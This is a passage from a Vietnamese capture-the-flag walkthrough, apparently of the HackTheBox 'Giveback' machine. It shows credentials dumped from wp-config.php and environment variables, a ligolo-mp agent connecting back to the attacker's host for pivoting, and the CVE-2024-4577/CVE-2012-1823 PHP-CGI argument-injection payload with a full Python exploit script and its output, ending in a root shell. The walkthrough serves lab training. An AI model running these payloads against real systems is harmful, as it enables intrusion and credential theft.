drwxrwsr-x  2 1001 1001  4096 Dec  8 04:48 tmp
-rw-rw-r--  1 1001 1001  7387 Dec  8 04:48 wp-activate.php
drwxrwsr-x  9 1001 1001  4096 Dec  8 04:48 wp-admin
-rw-rw-r--  1 1001 1001   351 Dec  8 04:48 wp-blog-header.php
-rw-rw-r--  1 1001 1001  2323 Dec  8 04:48 wp-comments-post.php
-rw-rw-r--  1 1001 1001  3336 Dec  8 04:48 wp-config-sample.php
lrwxrwxrwx  1 1001 1001    32 Dec  8 04:49 wp-config.php -> /bitnami/wordpress/wp-config.php
lrwxrwxrwx  1 1001 1001    29 Dec  8 04:49 wp-content -> /bitnami/wordpress/wp-content
-rw-rw-r--  1 1001 1001  5617 Dec  8 04:48 wp-cron.php
drwxrwsr-x 30 1001 1001 12288 Dec  8 04:48 wp-includes
-rw-rw-r--  1 1001 1001  2502 Dec  8 04:48 wp-links-opml.php
-rw-rw-r--  1 1001 1001  3937 Dec  8 04:48 wp-load.php
-rw-rw-r--  1 1001 1001 51414 Dec  8 04:48 wp-login.php
-rw-rw-r--  1 1001 1001  8727 Dec  8 04:48 wp-mail.php
-rw-rw-r--  1 1001 1001 30081 Dec  8 04:48 wp-settings.php
-rw-rw-r--  1 1001 1001 34516 Dec  8 04:48 wp-signup.php
-rw-rw-r--  1 1001 1001  5102 Dec  8 04:48 wp-trackback.php
-rw-rw-r--  1 1001 1001  3205 Dec  8 04:48 xmlrpc.php
<wordpress-7bdd4896bc-wnvwx:/opt/bitnami/wordpress$** 
```

Nhìn thấy có file **`wp-config.php`** → kiểm tra nó thử

```bash
**<wordpress-7bdd4896bc-wnvwx:/opt/bitnami/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'bitnami_wordpress' );

/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );

/** Database hostname */
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'G7T{pv:!LZWUfekgP{A8TGFoL0,dMEU,&2B)ALoZS[8lo8V~+UGj@kWW%n^.vZgx' );
define( 'SECURE_AUTH_KEY',  'F3!hvuWAWvZw^$^|L]ONjyS{*xPHr(j,2$)!@t.(ZEn9NPNQ!A*6o6l}8@IN)>?>' );
define( 'LOGGED_IN_KEY',    'E5x5$T@Ggpti3+!/0G<>j<ylElF+}#Ny-7XZLw<#j[6|:oel9%OgxG|U}86./&&K' );
define( 'NONCE_KEY',        'jM^E^Bx{vf-Ca~2$eXbH%RzD?=VmxWP9Z}-}J1E@N]t`GOP`8;<F;lYmGz8sh7sG' );
define( 'AUTH_SALT',        '+L>`[0~bk-bRDX 5F?ER)PUnB_ ZWSId=J {5XV:trSTp0u!~6shvPS`VP{f(@_Q' );
define( 'SECURE_AUTH_SALT', 'RdhA5mNy%0~H%~s~S]a,G~;=n|)+~hZ/JWy*$GP%sAB-f>.;rcsO6.HXPvw@2q,]' );
define( 'LOGGED_IN_SALT',   'i?aJHLYu/rI%@MWZTw%Ch~%h|M/^Wum4$#4;qm(#zgQA+X3gKU?~B)@Mbgy %k}G' );
define( 'NONCE_SALT',       'Y!dylf@|OTpnNI+fC~yFTq@<}$rN)^>=+e}Q~*ez?1dnb8kF8@_{QFy^n;)gk&#q' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */

define( 'FS_METHOD', 'direct' );
/**
 * The WP_SITEURL and WP_HOME options are configured to access from any hostname or IP address.
 * If you want to access only from an specific domain, you can modify them. For example:
 *  define('WP_HOME','http://example.com');
 *  define('WP_SITEURL','http://example.com');
 *
 */
if ( defined( 'WP_CLI' ) ) {
        $_SERVER['HTTP_HOST'] = '127.0.0.1';
}

define( 'WP_HOME', 'http://' . $_SERVER['HTTP_HOST'] . '/' );
define( 'WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] . '/' );
define( 'WP_AUTO_UPDATE_CORE', false );
/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

/**
 * Disable pingback.ping xmlrpc method to prevent WordPress from participating in DDoS attacks
 * More info at: https://docs.bitnami.com/general/apps/wordpress/troubleshooting/xmlrpc-and-pingback/
 */
if ( !defined( 'WP_CLI' ) ) {
        // remove x-pingback HTTP header
        add_filter("wp_headers", function($headers) {
                unset($headers["X-Pingback"]);
                return $headers;
        });
        // disable pingbacks
        add_filter( "xmlrpc_methods", function( $methods ) {
                unset( $methods["pingback.ping"] );
                return $methods;
        });
}**

```

Mình tìm ra 1 vài thông tin database. 

```bash
**define( 'DB_NAME', 'bitnami_wordpress' );

/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );

/** Database hostname */
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );**
```

Giờ mình thử vào trong db coi nó có gì. 

```bash
**<wordpress-7bdd4896bc-wnvwx:/opt/bitnami/wordpress$ mysql -h beta-vino-wp-mariadb -u bn_wordpress -p'sW5sp4spa3u7RLyetrekE4oS'
<ariadb -u bn_wordpress -p'sW5sp4spa3u7RLyetrekE4oS'
mysql: Deprecated program name. It will be removed in a future release, use '/opt/bitnami/mysql/bin/mariadb' instead**
```

Sau một hồi lâu thì ko thấy có connect được 

Cho nên mình bắt đầu xem thử file **`env`** 

```bash
**<-7bdd4896bc-wnvwx:/opt/bitnami/wordpress/wp-admin$ env
env
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
KUBERNETES_SERVICE_PORT_HTTPS=443
WORDPRESS_SMTP_PASSWORD=
WORDPRESS_SMTP_FROM_EMAIL=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
WEB_SERVER_HTTP_PORT_NUMBER=8080
WORDPRESS_RESET_DATA_PERMISSIONS=no
KUBERNETES_SERVICE_PORT=443
WORDPRESS_EMAIL=user@example.com
WP_CLI_CONF_FILE=/opt/bitnami/wp-cli/conf/wp-cli.yml
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
MARIADB_PORT_NUMBER=3306
MODULE=wordpress
WORDPRESS_SMTP_FROM_NAME=FirstName LastName
HOSTNAME=beta-vino-wp-wordpress-7bdd4896bc-wnvwx
WORDPRESS_SMTP_PORT_NUMBER=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WORDPRESS_EXTRA_CLI_ARGS=
APACHE_BASE_DIR=/opt/bitnami/apache
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
APACHE_VHOSTS_DIR=/opt/bitnami/apache/conf/vhosts
WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
WORDPRESS_ENABLE_DATABASE_SSL=no
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
APACHE_DAEMON_USER=daemon
BITNAMI_ROOT_DIR=/opt/bitnami
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
WORDPRESS_BASE_DIR=/opt/bitnami/wordpress
WORDPRESS_SCHEME=http
WORDPRESS_LOGGED_IN_SALT=
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
WORDPRESS_DATA_TO_PERSIST=wp-config.php wp-content
WORDPRESS_HTACCESS_OVERRIDE_NONE=no
WORDPRESS_DATABASE_SSL_CERT_FILE=
APACHE_HTTPS_PORT_NUMBER=8443
PWD=/opt/bitnami/wordpress/wp-admin
OS_FLAVOUR=debian-12
WORDPRESS_SMTP_PROTOCOL=
WORDPRESS_CONF_FILE=/opt/bitnami/wordpress/wp-config.php
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
WP_CLI_BASE_DIR=/opt/bitnami/wp-cli
WORDPRESS_VOLUME_DIR=/bitnami/wordpress
WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf
APACHE_BIN_DIR=/opt/bitnami/apache/bin
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
WORDPRESS_PLUGINS=none
WORDPRESS_FIRST_NAME=FirstName
MARIADB_HOST=beta-vino-wp-mariadb
WORDPRESS_EXTRA_WP_CONFIG_CONTENT=
WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no
WORDPRESS_DATABASE_USER=bn_wordpress
PHP_DEFAULT_UPLOAD_MAX_FILESIZE=80M
WORDPRESS_AUTH_KEY=
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain
APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default
WORDPRESS_DATABASE_SSL_KEY_FILE=
WORDPRESS_LOGGED_IN_KEY=
APACHE_CONF_DIR=/opt/bitnami/apache/conf
HOME=/
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
WEB_SERVER_DAEMON_GROUP=daemon
PHP_DEFAULT_POST_MAX_SIZE=80M
WORDPRESS_ENABLE_HTTPS=no
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
WORDPRESS_TABLE_PREFIX=wp_
WORDPRESS_DATABASE_PORT_NUMBER=3306
WORDPRESS_DATABASE_NAME=bitnami_wordpress
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
APACHE_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
WP_CLI_DAEMON_GROUP=daemon
APACHE_DEFAULT_HTTP_PORT_NUMBER=8080
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920
WORDPRESS_AUTO_UPDATE_LEVEL=none
BITNAMI_DEBUG=false
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
WORDPRESS_USERNAME=user
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
WORDPRESS_ENABLE_XML_RPC=no
WORDPRESS_BLOG_NAME=User's Blog!
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
APACHE_PID_FILE=/opt/bitnami/apache/var/run/httpd.pid
WORDPRESS_AUTH_SALT=
APACHE_LOGS_DIR=/opt/bitnami/apache/logs
WORDPRESS_EXTRA_INSTALL_ARGS=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
APACHE_DAEMON_GROUP=daemon
WORDPRESS_NONCE_KEY=
WEB_SERVER_HTTPS_PORT_NUMBER=8443
WORDPRESS_SMTP_HOST=
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
WORDPRESS_NONCE_SALT=
APACHE_DEFAULT_HTTPS_PORT_NUMBER=8443
APACHE_CONF_FILE=/opt/bitnami/apache/conf/httpd.conf
WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
WEB_SERVER_DEFAULT_HTTPS_PORT_NUMBER=8443
WP_NGINX_SERVICE_SERVICE_PORT=80
WORDPRESS_LAST_NAME=LastName
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
WORDPRESS_ENABLE_MULTISITE=no
WORDPRESS_SKIP_BOOTSTRAP=no
WORDPRESS_MULTISITE_EXTERNAL_HTTPS_PORT_NUMBER=443
SHLVL=2
WORDPRESS_SECURE_AUTH_SALT=
BITNAMI_VOLUME_DIR=/bitnami
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
KUBERNETES_PORT_443_TCP_PROTO=tcp
BITNAMI_APP_NAME=wordpress
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
WEB_SERVER_GROUP=daemon
WORDPRESS_PASSWORD=O8F7KR5zGi
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess
WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
WORDPRESS_SECURE_AUTH_KEY=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
APACHE_TMP_DIR=/opt/bitnami/apache/var/run
APP_VERSION=6.8.1
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
ALLOW_EMPTY_PASSWORD=yes
WP_CLI_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin
WORDPRESS_VERIFY_DATABASE_SSL=yes
OS_NAME=linux
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
APACHE_SERVER_TOKENS=Prod
PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitnami/apache/bin:/opt/bitnami/mysql/bin:/opt/bitnami/wp-cli/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
WORDPRESS_ENABLE_HTACCESS_PERSISTENCE=no
WORDPRESS_ENABLE_REVERSE_PROXY=no
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WORDPRESS_SMTP_USER=
WEB_SERVER_TYPE=apache
WORDPRESS_MULTISITE_HOST=
PHP_DEFAULT_MEMORY_LIMIT=512M
WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
WORDPRESS_DATABASE_SSL_CA_FILE=
WEB_SERVER_DAEMON_USER=daemon
OS_ARCH=amd64
OLDPWD=/opt/bitnami/wordpress
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
_=/usr/bin/env**

```

Từ file này mình thu được 1 WordPress Admin Credential **`user:O8F7KR5zGi`** 

Từ file này mình thu được 1 WordPress Admin Credential **`user:O8F7KR5zGi`** và ****Internal Service Discorved ****là **`LEGACY_INTRANET_SERVICE` ,** ip **`10.43.2.241`** và port **`5000`**

→ thực hiện dùng các tool pivot như **`chisel`** , **`proxychains`** nhưng mình có thể dùng [**ligolo-mp**](https://github.com/ttpreport/ligolo-mp).

## Pivot

---

Mình bắt đầu startup 1 server. 

```bash
**└─$ sudo ligolo-mp server -laddr 0.0.0.0:11601**
```

![image](/assets/images/HTB/season9/Giveback/image%2030.png)

Nó sẽ xuất hiện 1 interface, mình chỉ cần click **`Connect`** tới Admin

![image](/assets/images/HTB/season9/Giveback/image%2031.png)

![image](/assets/images/HTB/season9/Giveback/image%2032.png)

Sau khi mình nhìn thấy, mình chọn **`Ctrl + N`** để tạo 1 agent để file này sẽ được upload qua **`penelope`** lên các session trên.

Nhìn thấy nó tự tạo ra 1 file **`agent`** 

![image](/assets/images/HTB/season9/Giveback/image%2033.png)

![image](/assets/images/HTB/season9/Giveback/image%2034.png)

Thì nó đã tạo ra thành công, giờ thì mình rename thành **`agent`** và quay lại session, đồng thời upload nó lên. 

```bash
**<-7bdd4896bc-wnvwx:/opt/bitnami/wordpress/wp-admin$ ^C^C

[!] Session detached ⇲

(Penelope)─(Session [1])> upload agent
[+] Upload OK /opt/bitnami/wordpress/wp-admin/agent-TQmaurmY

(Penelope)─(Session [1])>** 
```

Sau đó mình quay lại **`sessions 1`** và thực thi nó.

```bash
**(Penelope)─(Session [1])> sessions 1
[+] Interacting with session [1], Shell Type: Raw, Menu key: Ctrl-C 
[+] Logging to /home/kali/.penelope/sessions/beta-vino-wp-wordpress-7bdd4896bc-wnvwx~10.10.11.94-Linux-x86_64/2025_12_08-14_53_45-539.log 📜
<-7bdd4896bc-wnvwx:/opt/bitnami/wordpress/wp-admin$ mv agent-TQmaurmY agent
mv agent-TQmaurmY agent
<-7bdd4896bc-wnvwx:/opt/bitnami/wordpress/wp-admin$ ./agent -connect 10.10.16.72:11601 -ignore-cert**
```

![image](/assets/images/HTB/season9/Giveback/image%2035.png)

Nhìn thấy thì mình đã có connect về server của mình. 

⇒ tiếp theo mình sẽ add route tới **`10.43.2.0/24`** .

![image](/assets/images/HTB/season9/Giveback/image%2036.png)

Mình thêm các thông tin vào. 

![image](/assets/images/HTB/season9/Giveback/image%2037.png)

Sau đó mình chọn vào **`start relay`** 

![image](/assets/images/HTB/season9/Giveback/image%2038.png)

Mình thử ping vào mạng bên trong. 

![image](/assets/images/HTB/season9/Giveback/image%2039.png)

Giờ thì mình truy cập qua port `5000` 

![image](/assets/images/HTB/season9/Giveback/image%2040.png)

Thì mình thấy dòng **Developer Note → web chạy trên windows IIS và dùng php-cgi.exe** 

→ Sau khi tìm kiếm trên internet thì nhìn thấy có CVE-2024-4577

- https://github.com/watchtowrlabs/CVE-2024-4577

### CVE-2024-4577, CVE-2012-1823

Mình tìm ra 1 reporter tên là [**Orange Tsai**](https://blog.orange.tw/) là một trong những hacker nổi tiếng. 

Check blog [**2024-06-cve-2024-4577-yet-another-php-rce**](https://blog.orange.tw/posts/2024-06-cve-2024-4577-yet-another-php-rce/) và tìm ra [**PHP RCE: A Bypass of CVE-2012-1823,Argument Injection in PHP-CGI**](https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv) để bypass [**CVE-2012-1823 - PHP-CGI query string parameter vulnerability**](https://bugs.php.net/bug.php?id=61910). 

Sau khi phân tích lại hai CVEs liên quan thì sẽ gửi payload như sau: 

```php
**http://server/php-cgi/php-cgi.exe?%add+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input**
```

Đồng thời mình cũng có thể chạy theo cách exploit của [**cve-2012-1823**](https://pentesterlab.com/exercises/cve-2012-1823) từ pentesterlab. Và cũng lấy script để test trên [**exploit-db**](https://www.exploit-db.com/exploits/18836)

```python
**######################################################################################
# Exploit Title: Cve-2012-1823 PHP CGI Argument Injection Exploit
# Date: May 4, 2012
# Author: rayh4c[0x40]80sec[0x2e]com
# Exploit Discovered by wofeiwo[0x40]80sec[0x2e]com
######################################################################################

import socket
import sys

def cgi_exploit():
        pwn_code = """<?php phpinfo();?>""" 
        post_Length = len(pwn_code)
        http_raw="""POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: %s

%s
""" %(HOST , post_Length ,pwn_code)
        print http_raw
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, int(PORT)))
            sock.send(http_raw)
            data = sock.recv(10000)
            print repr(data)
            sock.close()
        except socket.error, msg:
            sys.stderr.write("[ERROR] %s\n" % msg[1])
            sys.exit(1)
               
if __name__ == '__main__':
        try:
            HOST = sys.argv[1]
            PORT = sys.argv[2]
            cgi_exploit()
        except IndexError:
            print '[+]Usage: cgi_test.py site.com 80'
            sys.exit(-1)**
            
```

```bash
**┌──(kali㉿kali)-[~/Desktop/giveback/CVE-2024-5932]
└─$ python3 test_cgi.py 10.43.2.241 5000
POST /?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input HTTP/1.1
Host: 10.43.2.241
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

<?php phpinfo();?>

b'HTTP/1.1 200 OK\r\nServer: nginx/1.24.0\r\nDate: Tue, 09 Dec 2025 10:12:09 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n814\r\n<!DOCTYPE html>\n<html>\n<head>\n  <title>GiveBack LLC Internal CMS</title>\n  <!-- Developer note: phpinfo accessible via debug mode during migration window -->\n  <style>\n    body { font-family: Arial, sans-serif; margin: 40px; background: #f9f9f9; }\n    .header { color: #333; border-bottom: 1px solid #ccc; padding-bottom: 10px; }\n    .info { background: #eef; padding: 15px; margin: 20px 0; border-radius: 5px; }\n    .warning { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; margin: 10px 0; }\n    .resources { margin: 20px 0; }\n    .resources li { margin: 5px 0; }\n    a { color: #007bff; text-decoration: none; }\n    a:hover { text-decoration: underline; }\n  </style>\n</head>\n<body>\n  <div class="header">\n    <h1>\xf0\x9f\x8f\xa2 GiveBack LLC Internal CMS System</h1>\n    <p><em>Development Environment \xe2\x80\x93 Internal Use Only</em></p>\n  </div>\n\n  <div class="warning">\n    <h4>\xe2\x9a\xa0\xef\xb8\x8f Legacy Notice</h4>\n    <p>**SRE** - This system still includes legacy CGI support. Cluster misconfiguration may likely expose internal scripts.</p>\n  </div>\n\n  <div class="resources">\n    <h3>Internal Resources</h3>\n    <ul>\n      <li><a href="/admin/">/admin/</a> \xe2\x80\x94 VPN Required</li>\n      <li><a href="/backups/">/backups/</a> \xe2\x80\x94 VPN Required</li>\n      <li><a href="/runbooks/">/runbooks/</a> \xe2\x80\x94 VPN Required</li>\n      <li><a href="/legacy-docs/">/legacy-docs/</a> \xe2\x80\x94 VPN Required</li>\n      <li><a href="/debug/">/debug/</a> \xe2\x80\x94 Disabled</li>\n      <li><a href="/cgi-bin/info">/cgi-bin/info</a> \xe2\x80\x94 CGI Diagnostics</li>\n      <li><a href="/cgi-bin/php-cgi">/cgi-bin/php-cgi</a> \xe2\x80\x94 PHP-CGI Handler</li>\n      <li><a href="/phpinfo.php">/phpinfo.php</a></li>\n      <li><a href="/robots.txt">/robots.txt</a> \xe2\x80\x94 Crawlers: Disallowed</li>\n    </ul>\n  </div>\n\n  <div class="info">\n    <h3>Developer Note</h3>\n    <p>This CMS was originally deployed on Windows IIS using <code>php-cgi.exe</code>.\n    During migration to Linux, the Windows-style CGI handling was retained to ensure\n    legacy scripts continued to function without modification.</p>\n  </div>\n</body>\n</html>\n\r\n'**
```

Tiếp theo thì mình sẽ triển 1 cái reverse shell qua **`curl`** 

```bash
**┌──(kali㉿kali)-[~/Desktop/giveback/CVE-2024-5932]
└─$ penelope -p 5555                    
[+] Listening for reverse shells on 0.0.0.0:5555 →  127.0.0.1 • 192.168.116.130 • 172.18.0.1 • 172.17.0.1 • 10.10.16.72
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)**
```

![image](/assets/images/HTB/season9/Giveback/image%2041.png)

Quay lại tab penelope 

![image](/assets/images/HTB/season9/Giveback/image%2042.png)

Kiểm tra thì mình dược kết quả như sau

![image](/assets/images/HTB/season9/Giveback/image%2043.png)

Hiện tại mình đang là **`root`** bên trong internal service. 

→ thử check **`env`**

```bash
**env
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.43.0.1:443
HOSTNAME=legacy-intranet-cms-6f7bf5db84-b4z8d
PHP_INI_DIR=/usr/local/etc/php
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
WP_NGINX_SERVICE_SERVICE_PORT=80
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
SHLVL=4
PHP_CGI_VERSION=8.3.3
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
HOME=/root
OLDPWD=/var/www/html/cgi-bin
PHP_LDFLAGS=-Wl,-O1 -pie
LEGACY_CGI_ENABLED=true
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
PHP_VERSION=8.3.3
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
LEGACY_MODE=enabled
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
GPG_KEYS=1198C0117593497A5EC5C199286AF1F9897469DC C28D937575603EB4ABB725861C0779DC5C0A9DE4 AFD8691FDAEDF03BDF6E460563F15A9B715376CA
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_ASC_URL=https://www.php.net/distributions/php-8.3.3.tar.xz.asc
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
PHP_URL=https://www.php.net/distributions/php-8.3.3.tar.xz
PHP_MAX_EXECUTION_TIME=120
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
KUBERNETES_PORT_443_TCP_PORT=443
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
PHP_MEMORY_LIMIT=128M
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
KUBERNETES_PORT_443_TCP_PROTO=tcp
CMS_ENVIRONMENT=development
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
PHPIZE_DEPS=autoconf            dpkg-dev dpkg           file            g++             gcc             libc-dev              make            pkgconf                 re2c
KUBERNETES_SERVICE_HOST=10.43.0.1
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
PWD=/var/www/html
PHP_SHA256=b0a996276fe21fe9ca8f993314c8bc02750f464c7b0343f056fb0894a8dfa9d1
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000**
```

Từ output trên mình nhìn thấy 1 số thông tin. 

```bash
**KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_SERVICE_HOST=10.43.0.1
HOSTNAME=legacy-intranet-cms-6f7bf5db84-b4z8d**
```

Nghĩa là mình đang ở trong k8s vì vậy mình cần check k8s service account và cũng để enumerate k8s 

## Kubernetes

